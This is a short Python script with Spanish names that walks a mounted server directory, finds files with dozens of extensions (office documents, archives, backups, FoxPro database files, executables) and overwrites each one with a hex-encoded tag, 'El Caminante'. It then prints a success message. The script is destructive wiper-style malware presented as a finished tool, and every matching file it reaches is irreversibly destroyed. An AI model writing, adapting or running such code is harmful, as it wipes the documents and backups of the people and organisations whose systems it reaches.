import os 
import binascii
import sys

def buscar(ruta, extension):
    devuelto = []
    b = os.walk(ruta)
    
    for root, dirs, files in b:
        for archivos in files:
            if extension.lower() == os.path.splitext(archivos)[1].lower():
                rya = os.path.join(root, archivos)
                devuelto.append(rya)
    return devuelto

def escribir(archivo, mensaje):
    msg = binascii.hexlify(mensaje)
    try:
        fo = open(archivo, 'wb')
        fo.write(msg)
        fo.close()
    except:
        a, b, c = sys.exc_info()
        print(b)

def recorrer(lista, msj):
    for f in lista:
        escribir(f, msj)
        
if __name__ == '__main__':
    ruta = '/media/serv_coromoto/prueba'
    
    extensiones = ['.xls', '.doc', '.ppt', '.zip', '.dbf', 
    '.bak', '.fpt', '.dct', '.dbc', '.cdx', 
    '.tbk', '.rar', '.txt', '.idx', '.prg', 
    '.frx', '.frt', '.scx', '.sct', '.mnx', 
    '.mnt', '.pjx', '.pjt', 'mpr', 'mpx', '.exe' ]
    
    for ext in extensiones:
        lista = buscar(ruta, ext)
        recorrer(lista, 'El Caminante')

    print('Felicidades...! Proceso terminado con Exito')

